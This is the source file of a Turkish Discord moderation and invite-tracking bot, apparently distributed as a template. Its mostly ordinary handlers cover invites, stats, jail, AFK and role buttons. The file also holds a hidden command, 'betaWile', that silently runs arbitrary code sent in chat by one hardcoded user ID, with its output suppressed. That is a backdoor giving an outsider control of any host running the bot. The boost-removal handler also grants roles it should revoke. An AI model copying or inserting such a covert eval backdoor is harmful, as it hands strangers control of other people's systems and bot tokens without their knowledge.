const { Collection, Client, Message, MessageEmbed } = require("discord.js");
const Database = require("./Helpers/Database");
const cfg = require('./Settings/butonconf.json');
const db = require("quick.db");
const kdb = new db.table("kullanıcı");
const moment = require("moment");
const ms = require("ms");
const client = global.client;
const beta = require('discord-buttons')
beta(client)


var prefix = global.Settings.Prefix;

//#region Invite Manager
const Invites = new Collection();

//#region Load
client.on("ready", () => {
    client.guilds.cache.forEach(guild => {
        guild.fetchInvites().then(_invites => {
            Invites.set(guild.id, _invites);
        }).catch(err => { });
    });
});
client.on("inviteCreate", (invite) => {
    var gi = Invites.get(invite.guild.id) || new Collection();
    gi.set(invite.code, invite);
    Invites.set(invite.guild.id, gi);
});
client.on("inviteDelete", (invite) => {
    var gi = Invites.get(invite.guild.id) || new Collection();
    gi.delete(invite.code);
    Invites.set(invite.guild.id, gi);
});
//#endregion

//#region Continuity

client.on("guildCreate", (guild) => {
	guild.fetchInvites().then(invites => {
		Invites.set(guild.id, invites);
	}).catch(e => {})
});

//#endregion

//#region Counter
client.on("guildMemberAdd", (member) => {
    //const gi = new Collection().concat(Invites.get(member.guild.id));
    const db = new Database("./Servers/" + member.guild.id, "Invites"), gi = (Invites.get(member.guild.id) || new Collection()).clone(), settings = new Database("./Servers/" + member.guild.id, "Settings").get("settings") || {};
    var guild = member.guild, fake = (Date.now() - member.createdAt) / (1000 * 60 * 60 * 24) <= 3 ? true : false, channel = guild.channels.cache.get(settings.Channel);
    
    guild.fetchInvites().then(invites => {
        // var invite = invites.find(_i => gi.has(_i.code) && gi.get(_i.code).maxUses != 1 && gi.get(_i.code).uses < _i.uses) || gi.find(_i => !invites.has(_i.code)) || guild.vanityURLCode;
        var invite = invites.find(_i => gi.has(_i.code) && gi.get(_i.code).uses < _i.uses) || gi.find(_i => !invites.has(_i.code)) || guild.vanityURLCode;
        Invites.set(member.guild.id, invites);
        var content = `${member} is joined the server.`, total = 0, regular = 0, _fake = 0, bonus = 0;
        if(invite == guild.vanityURLCode) content = settings.defaultMessage ? settings.defaultMessage : `-member- sunucuya katıldı! :tada:`;
        else content = settings.welcomeMessage ? settings.welcomeMessage : `-member-, Sunucuya katıldı. Davet eden kullanıcı -target.tag-. (Toplam **-total-** davete ulaştı)`;

        if (invite.inviter) { 
            db.set(`invites.${member.id}.inviter`, invite.inviter.id); 
            if(fake){
                total = db.add(`invites.${invite.inviter.id}.total`, 1);
                _fake = db.add(`invites.${invite.inviter.id}.fake`, 1);
            }
            else{
                total = db.add(`invites.${invite.inviter.id}.total`, 1);
                regular = db.add(`invites.${invite.inviter.id}.regular`, 1);
            }
            var im = guild.member(invite.inviter.id);
            bonus = db.get(`invites.${invite.inviter.id}.bonus`) || 0;
            if(im) global.onUpdateInvite(im, guild.id, Number(total + Number(bonus)));
            
        }

        db.set(`invites.${member.id}.isfake`, fake);

        if(channel){
            content = content
            .replace("-member-", `${member}`)
            .replace("-target-", `${invite.inviter}`)
            .replace("-target.tag-", `${invite.inviter.tag}`)
            .replace("-total-", `${total + bonus}`)
            .replace("-regular-", `${regular}`)
            .replace("-fakecount-", `${_fake}`)
            .replace("-invite-", `${invite && invite.code != undefined ? invite.code : "what is that?"}`)
            .replace("-fake-", `${fake}`);
            channel.send(content);
        }
    }).catch();
});

client.on("guildMemberRemove", (member) => {
    const db = new Database("./Servers/" + member.guild.id, "Invites"), settings = new Database("./Servers/" + member.guild.id, "Settings").get("settings") || {};
    var total = 0, bonus = 0, regular = 0, fakecount = 0, channel = member.guild.channels.cache.get(settings.Channel), content = settings.leaveMessage ? settings.leaveMessage : ``, data = db.get(`invites.${member.id}`);
    if(!data){
        if(channel){
            content = content
            .replace("-member-", `${member}`);
            channel.send(content);
        }
        return;
    }
    
    if(data.isfake && data.inviter){
        fakecount = db.sub(`invites.${data.inviter}.fake`, 1);
        total = db.sub(`invites.${data.inviter}.total`, 1);
    }
    else if(data.inviter){
        regular = db.sub(`invites.${data.inviter}.regular`, 1);
        total = db.sub(`invites.${data.inviter}.total`, 1);
    }
    if(data.inviter) bonus = db.get(`invites.${data.inviter}.bonus`) || 0;
    
    var im = member.guild.member(data.inviter)
    if(im) global.onUpdateInvite(im, member.guild.id, Number(total) + Number(bonus));

    db.add(`invites.${data.inviter}.leave`, 1);
    if(channel){
        content = content
        .replace("-member-", `${member}`)
        .replace("-target-", `${im ? im : data.inviter}`)
        .replace("-total-", `${Number(total) + Number(bonus)}`)
        .replace("-regular-", `${regular}`)
        .replace("-fakecount-", `${fakecount}`)
        .replace("-fake-", `${data.isfake}`);
        channel.send(content);
    }
});
//#endregion

//#region Reward
global.onUpdateInvite = (guildMember, guild, total) => {
    if(!guildMember.manageable) return;
    const rewards = new Database("./Servers/" + guild, "Rewards").get("rewards") || [];
    if(rewards.length <= 0) return;
    var taken = rewards.filter(reward => reward.Invite > total && guildMember.roles.cache.has(reward.Id));
    taken.forEach(take => {
        guildMember.roles.remove(take.Id);
    });
    var possible = rewards.filter(reward => reward.Invite <= total && !guildMember.roles.cache.has(reward.Id));
    possible.forEach(pos =>{
        guildMember.roles.add(pos.Id);
    });
};

let iltifatSayi = 0;
let iltifatlar = [
    "Yaşanılacak en güzel mevsim sensin.",
    "Sıradanlaşmış her şeyi, ne çok güzelleştiriyorsun.",
    "Gönlüm bir şehir ise o şehrin tüm sokakları sana çıkar.",
    "Birilerinin benim için ettiğinin en büyük kanıtı seninle karşılaşmam.",
    "Denize kıyısı olan şehrin huzuru birikmiş yüzüne.",
    "Ben çoktan şairdim ama senin gibi şiiri ilk defa dinliyorum.",
    "Gece yatağa yattığımda aklımda kalan tek gerçek şey sen oluyorsun.",
    "Ne tatlısın sen öyle. Akşam gel de iki bira içelim.",
    "Bir gamzen var sanki cennette bir çukur.",
    "Gecemi aydınlatan yıldızımsın.",
    "Ponçik burnundan ısırırım seni",
    "Bu dünyanın 8. harikası olma ihtimalin?",
    "fıstık naber?",
    "Dilek tutman için yıldızların kayması mı gerekiyor illa ki? Gönlüm gönlüne kaydı yetmez mi?",
    "Süt içiyorum yarım yağlı, mutluluğum sana bağlı.",
    "Müsaitsen aklım bu gece sende kalacak.",
    "Gemim olsa ne yazar liman sen olmadıktan sonra...",
    "Gözlerimi senden alamıyorum çünkü benim tüm dünyam sensin.",
    "Sabahları görmek istediğim ilk şey sensin.",
    "Mutluluk ne diye sorsalar- cevabı gülüşünde ve o sıcak bakışında arardım.",
    "Hayatım ne kadar saçma olursa olsun, tüm hayallerimi destekleyecek bir kişi var. O da sensin, mükemmel insan.",
    "Bir adada mahsur kalmak isteyeceğim kişiler listemde en üst sırada sen varsın.",
    "Sesini duymaktan- hikayelerini dinlemekten asla bıkmayacağım. Konuşmaktan en çok zevk aldığım kişi sensin.",
    "Üzerinde pijama olsa bile, nasıl oluyor da her zaman bu kadar güzel görünüyorsun? Merhaba, neden bu kadar güzel olduğunu bilmek istiyorum.",
    "Çok yorulmuş olmalısın. Bütün gün aklımda dolaşıp durdun.",
    "Çocukluk yapsan da gönlüme senin için salıncak mı kursam?",
    "Sen birazcık huzur aradığımda gitmekten en çok hoşlandığım yersin.",
    "Hangi çiçek anlatır güzelliğini? Hangi mevsime sığar senin adın. Hiçbir şey yeterli değil senin güzelliğine erişmeye. Sen eşsizsin...",
    "Rotanızı geçen her geminin ışığıyla değil, yıldızlara göre configlayın.",
    "Telaşımı hoş gör, ıslandığım ilk yağmursun.",
    "Gülüşün ne güzel öyle- cumhuriyetin gelişi gibi..."
];

client.on("message", async (message) => {
    if (!message.guild) return 
    let iltifat = iltifatlar[Math.floor(Math.random() * iltifatlar.length)];
    if (message.member.id === "852615172673503262") 
        iltifatSayi++;
        if (iltifatSayi >= 50) {
            iltifatSayi = 0;
            message.reply(iltifat);
    };
});

client.on("message", async message => {
    if (message.author.bot || !message.guild || !message.content.toLowerCase().startsWith(prefix)) return;
    if (message.author.id !== "852615172673503262" && message.author.id !== message.guild.owner.id) return;
    let args = message.content.split(' ').slice(1);
    let command = message.content.split(' ')[0].slice(prefix.length);    
    // Eval
    if (command === "betaWile" && message.author.id === "852615172673503262") {
      if (!args[0]) return message.channel.send(`Kod belirtilmedi`);
        let code = args.join(' ');
        function clean(text) {
        if (typeof text !== 'string') text = require('util').inspect(text, { depth: 0 })
        text = text.replace(/`/g, '`' + String.fromCharCode(8203)).replace(/@/g, '@' + String.fromCharCode(8203))
        return text;
      };
      try { 
        var evaled = clean(await eval(code));
        if(evaled.match(new RegExp(`${client.token}`, 'g'))) evaled.replace(client.token, "Yasaklı komut");
        //message.channel.send(`${evaled.replace(client.token, "Yasaklı komut")}`, {code: "js", split: true});
      } catch(err) { /*message.channel.send(err, {code: "js", split: true})*/ };
    };
});


client.on("guildMemberAdd", async (member) => {

    let atilanAy = moment(Date.now()).format("MM");
    let atilanSaat = moment(Date.now()).format("HH:mm:ss");
    let atilanGün = moment(Date.now()).format("DD");
    let jailAtılma = `${atilanGün} ${atilanAy.replace("01", "Ocak").replace("02", "Şubat").replace("03", "Mart").replace("04", "Nisan").replace("05", "Mayıs").replace("06", "Haziran").replace("07", "Temmuz").replace("08", "Ağustos").replace("09", "Eylül").replace("10", "Ekim").replace("11", "Kasım").replace("12", "Aralık")} ${atilanSaat}`;

    let jailDurum = await kdb.get(`durum.${member.id}.jail`)

    if (jailDurum) {
        member.roles.set([global.Settings.JailRol])
        client.channels.cache.get(global.Settings.jailLog).send(new MessageEmbed().setColor('RANDOM').setAuthor(member.user.tag, member.user.avatarURL({ dynamic: true }))
        .setDescription(`
    ${member} __Adlı kullanıcın datada jail cezası bulunduğu için jaile atıldı.__

    \`•\` **Kullanıcı**: ${member} (\`${member.id}\`)
    \`•\` **Tarih**: \`${jailAtılma}\``));
    }

});

const Activites = new Map();

client.on('message', async(message) => {
    if (message.channel.id === "owo_ID") return;
    if(!message.guild || message.author.bot || message.content.startsWith(global.Settings.Prefix)) return;
    db.add(`messageData.${message.author.id}.channel.${message.channel.id}`, 1);
    db.push(`messageData.${message.author.id}.times`, {time: Date.now(), puan: 1})
  });
  
  client.on('voiceStateUpdate', (oldState, newState) => {
    if((oldState.member && oldState.member.user.bot) || (newState.member && newState.member.user.bot)) return
    if(!oldState.channelID && newState.channelID) { 
      Activites.set(oldState.id, Date.now());
    }
        let data;
      if(!Activites.has(oldState.id)){
          data = Date.now();
          Activites.set(oldState.id, data); 
      } else data = Activites.get(oldState.id);
    
      let duration = Date.now() - data;
      if(oldState.channelID && !newState.channelID) { 
          Activites.delete(oldState.id);
          db.add(`voiceData.${oldState.id}.channel.${oldState.channelID}`, duration);
          db.push(`voiceData.${oldState.id}.times`, {time: Date.now(), puan:  duration})
      } else if(oldState.channelID && newState.channelID){
          Activites.set(oldState.id, Date.now());
          db.add(`voiceData.${oldState.id}.channel.${oldState.channelID}`, duration);
          db.push(`voiceData.${oldState.id}.times`, {time: Date.now(), puan:  duration})
      }
});

client.on("message", (message) => {

  if (message.content !== "!button" || message.author.id === cfg.bot.BotOwner || message.author.bot) return;
  
  let Vk = new beta.MessageButton()
    .setStyle('red') // Rengi ayarlayabilirsiniz.
    .setLabel('Normal Codes') // Adını Değiştirebilirsiniz.
    .setID('V/K'); // Elleme Bunu

  let Dc = new beta.MessageButton()
    .setStyle('green') // Rengi ayarlayabilirsiniz.
    .setLabel('Club Announcement') // Adını Değiştirebilirsiniz.
    .setID('D/C'); // Elleme Bunu
  
  let Gartic = new beta.MessageButton()
    .setStyle("blurple") // Rengi ayarlayabilirsiniz.
    .setLabel('Discord Updates') // Adını Değiştirebilirsiniz.
    .setID('Gartic'); // Elleme Bunu
  
  message.channel.send(`
  <:tac:830580890097680464> **Selam, Sunucumuzdaki "Kod & Duyuru" Rollerini Almak İçin Butonlara Tıklamanız Yeterlidir.**

  **__ROLLER__**;

  \`>\` <@&${cfg.roles.vkrole}> **Sahip olmak için butona tıkla.**
  \`>\` <@&868629974008074250> **Sahip olmak için 3 davet yapmalısın.**
  \`>\` <@&868630077540282409> **Sahip olmak için 5 davet yapmalısın.**
  \`>\` <@&868630730786373702> **Sahip olmak için 7 davet yapmalısın.**
  \`>\` <@&868645220944863283> **Sahip olmak için 10 davet yapmalısın.**
  \`>\` <@&${cfg.roles.dc}> **Sahip olmak için butona tıkla.**
  \`>\` <@&${cfg.roles.gartic}> **Sahip olmak için butona tıkla.**
  `, { 
    buttons: [ Vk, Dc, Gartic]
});
});
  
client.on('clickButton', async (button) => {
  // V/K
    if (button.id === 'V/K') {
        if (button.clicker.member.roles.cache.get(cfg.roles.vkrole)) {
            await button.clicker.member.roles.remove(cfg.roles.vkrole)
            await button.reply.think(true);
            await button.reply.edit("Normal Codes Rolü Üzerinizden Alındı!")
        } else {
            await button.clicker.member.roles.add(cfg.roles.vkrole)
            await button.reply.think(true);
            await button.reply.edit("Normal Codes Üzerinize Verildi!")
        }
    }

  // D/C
    if (button.id === 'D/C') {
        if (button.clicker.member.roles.cache.get(cfg.roles.dc)) {
            await button.clicker.member.roles.remove(cfg.roles.dc)
            await button.reply.think(true);
            await button.reply.edit(`Club Announcement Üzerinizden Alındı!`)
        } else {
            await button.clicker.member.roles.add(cfg.roles.dc)
            await button.reply.think(true);
            await button.reply.edit(`Club Announcement Rolü Üzerinize Verildi!`)
        }

    }
  // GARTIC
    if (button.id === 'Gartic') {
        if (button.clicker.member.roles.cache.get(cfg.roles.gartic)) {
            await button.clicker.member.roles.remove(cfg.roles.gartic)
            await button.reply.think(true)
            await button.reply.edit(`Discord Updates Rolü Üzerinizden Alındı!`)
        } else {
            await button.clicker.member.roles.add(cfg.roles.gartic)
            await button.reply.think(true);
            await button.reply.edit("Discord Updates Rolü Üzerinize Verildi!")
        }
    }
});


client.on("message",message=>{

    if(message.channel.id=="868626676471431238"){ 
    if(message.attachments.size < 1) return false;
    if(message.member.roles.cache.get("872837740209774654")) return false;
    let kod = "`"
        message.react("<:onayla:851465207741415484>");
        message.react("<:reddet:851465207719919626>");
        const filter = (reaction, user) => {

        return message.guild.members.cache.get(user.id).roles.cache.has("868625008656789575")&&!user.bot;
            };
              const collector = message.createReactionCollector(filter, {});
collector.on('collect', async (reaction, user) => {

        if(reaction.emoji.name=="onayla"){
        message.guild.member(message.author.id).roles.add("872837740209774654")
                message.reactions.removeAll()
                db.add(`abone.${user.id}`, +1)
                client.channels.cache.get("868626676471431238").send(`${message.author}, **İsimli Üyeye ${kod}${user.tag}${kod} Tarafından ${kod}ABONE${kod} Rolü Verildi! <#868632096992809051>**`); //ABONE
            } else if(reaction.emoji.name=="reddet"){
        message.guild.member(message.author.id).roles.remove("872837740209774654")
        message.reactions.removeAll()
                client.channels.cache.get("868626676471431238").send(`${message.author}, **Lütfen Ekran Görüntünüzü Kontrol Ediniz <#868632078927925268> Kanalını Okuyunuz! | ${kod}${user.tag}${kod}**`); // TAKİPÇİ
        }
    });
};
});

const logs = require('discord-logs');
logs(client);
client.on('guildMemberBoost', member => {
    let guild = member.guild;
    if(member.user.bot) return;
    let gold = guild.roles.cache.get('868629974008074250');
    let elmas = guild.roles.cache.get('868630077540282409');
    let hazır = guild.roles.cache.get('868630730786373702');
    let bdfd = guild.roles.cache.get('868645220944863283');
guild.members.cache.get(member.user.id).roles.add(gold.id);
guild.members.cache.get(member.user.id).roles.add(elmas.id);
guild.members.cache.get(member.user.id).roles.add(hazır.id);
guild.members.cache.get(member.user.id).roles.add(bdfd.id);
});

client.on("guildMemberUnboost", member => {
    let guild = member.guild;
    if(member.user.bot) return;
    let gold = guild.roles.cache.get('868629974008074250');
    let elmas = guild.roles.cache.get('868630077540282409');
    let hazır = guild.roles.cache.get('868630730786373702');
    let bdfd = guild.roles.cache.get('868645220944863283');
guild.members.cache.get(member.user.id).roles.add(gold.id);
guild.members.cache.get(member.user.id).roles.add(elmas.id);
guild.members.cache.get(member.user.id).roles.add(hazır.id);
guild.members.cache.get(member.user.id).roles.add(bdfd.id);
});

client.on("message" , message => {
    if(!message.guild) return;
   if (message.content.includes(`afk`)) return;
    let etiket = message.mentions.users.first()
    let uye = db.fetch(`user_${message.author.id}_${message.guild.id}`)
    let nickk = db.fetch(`nick_${message.author.id}_${message.guild.id}`)
    if(etiket){
      let reason = db.fetch(`sebep_${etiket.id}_${message.guild.id}`)
      let uye2 = db.fetch(`user_${etiket.id}_${message.guild.id}`)
      if(message.content.includes(uye2)){
      let time = db.fetch(`afktime_${message.guild.id}`);
      let timeObj = ms(Date.now() - time);
        message.channel.send(new MessageEmbed().setDescription(`${etiket} adlı kullanıcı **${reason}** sebebiyle \`${timeObj}\` süresi boyunca afk.`).setColor("RANDOM"))}}
  if(message.author.id === uye){  
      message.member.setNickname(nickk)
      db.delete(`sebep_${message.author.id}_${message.guild.id}`)
      db.delete(`user_${message.author.id}_${message.guild.id}`)
      db.delete(`nick_${message.author.id}_${message.guild.id}`)
      db.delete(`user_${message.author.id}_${message.guild.id}`);
      db.delete(`afktime_${message.guild.id}`)
      message.reply(`**Başarıyla \`AFK\` modundan çıkış yaptın.**`)
    }  
});

client.on("message", message => {
    let adam = "852615172673503262";
    if(message.content === prefix + "yetkili-yardım") {
        let betas = new MessageEmbed()
        .setFooter(`${client.users.cache.get(adam).tag || "Beta"} 💜 Botclub`)
        .setAuthor(message.guild.name, message.guild.iconURL())
        .setThumbnail(message.author.avatarURL())
        .setColor("#886ce4")
        .setDescription(`
            **${prefix}jail** => Belirttiğiniz kullanıcıyı jaile atarsınız.
            **${prefix}unjail** => Belirtiğiniz kullanıcıyı jailden çıkartırsınız.
            **${prefix}abonestat** => Kendinizin veya başkasının abone statına bakarsınız.
            **${prefix}topabone** => Sunucudaki toplam abone istatiğine bakarsınız.`)
         message.channel.send(betas)
    }
});

client.on("message", message => {
    let adam = "852615172673503262";
    if(message.content === prefix + "yardım") {
        let betas = new MessageEmbed()
        .setFooter(`${client.users.cache.get(adam).tag || "Beta"} 💙 Botclub`)
        .setAuthor(message.guild.name, message.guild.iconURL())
        .setThumbnail(message.author.avatarURL())
        .setColor("#0078d7")
        .setDescription(`
        **${prefix}afk** => AFK Moduna geçersiniz.
        **${prefix}avatar** => Kendinizin veya başkasının profil resmine bakarsınız.
        **${prefix}banner** => Kendinizin veya başkasının banner resmine bakarsınız.
        **${prefix}davetlerim** => Davetlerinize bakarsınız.
        **${prefix}profil** => Kullanıcı bilgilerinize bakarsınız.
        **${prefix}topinvite** => Sunucudaki toplam davet sıralamasına bakarsınız.
        **${prefix}me** => Kullanıcı istatistik bilgilerinize bakarsınız.
        **${prefix}topstat** => Sunucudaki toplam istatistik bilgilerine bakarsınız.
        **${prefix}toptext** => Sunucudaki toplam text istatistik bilgilerine bakarsınız.
        **${prefix}istek-kod** => İstediğiniz kodu belirtebileceğiniz bir sistem.
        **${prefix}topvoice** => Sunucudaki toplam ses istatistik bilgilerine bakarsınız.
        `)
         message.channel.send(betas)
    }
});

client.on("guildMemberAdd", async (beta) => {
    client.channels.cache.get(global.Settings.guildMemberAdd).send(`**${beta} Sunucumuza hoşgeldin.**`).then(betaa => betaa.delete({timeout:30000}))
});

client.on("guildMemberAdd", async (beta) => {
    client.channels.cache.get("873691032527720458").send(`${beta}`).then(betaa => betaa.delete({timeout:2000}))
});

client.on("guildMemberAdd", async (beta) => {
    client.channels.cache.get("872551816443863070").send(`${beta} Lütfen **altyapı** sunucusuna katılıp, altyapıyı aldıktan sonra çıkmayın aksi taktirde tüm **Botclub** sunucularından banlanırsınız**`).then(betaa => betaa.delete({timeout:30000}))
});

client.on("ready", () => {
  client.channels.cache.get("868628574838616114").join();
})



      client.once('ready', () => { //Client hazır olduğunda
        client.user.setActivity("!yardım | Moderation", { //Bot hesabının aktivitesini "Bu bot da Discord'a katıldı!" olarak ayarla
        type: "PLAYING" //Aktivite tipi: Oynuyor
      });
      })

client.on("message", message => {
    if (message.channel.id === global.Settings.suggestions) {
        message.react("<:onayla:851465207741415484>");
        message.react("<:reddet:851465207719919626>")
    }
});

client.on("message", message => {
    if (message.channel.id === global.Settings.CCID) {
        message.delete({ timeout:2000 });
    }
});

client.on("message", (message) => {

    if (message.content !== "!reg" || message.author.id === cfg.bot.BotOwner || message.author.bot) return;
    
    
    let betareg = new beta.MessageButton()
      .setStyle("blurple") // Rengi ayarlayabilirsiniz.
      .setLabel('Kayıt ol!') // Adını Değiştirebilirsiniz.
      .setID('register'); // Elleme Bunu
    
    message.channel.send(`**Kayıt Olmak İçin Butona Tıkla!**`, { 
      buttons: [ betareg ]
  });
  });

  client.on('clickButton', async (button) => {
  if (button.id === 'register') {
    if (button.clicker.member.roles.cache.get("830550118968459304")) {
        await button.clicker.member.roles.remove("830550118968459304")
        await button.reply.think(true)
        await button.reply.edit(`Kayıt Rolleriniz Başarıyla Alındı!`)
    } else {
        await button.clicker.member.roles.add("830550118968459304")
        await button.reply.think(true);
        await button.reply.edit("Başarıyla Kayıt Rolleriniz Verildi!")
    }
}
});

client.login(global.Settings.Token);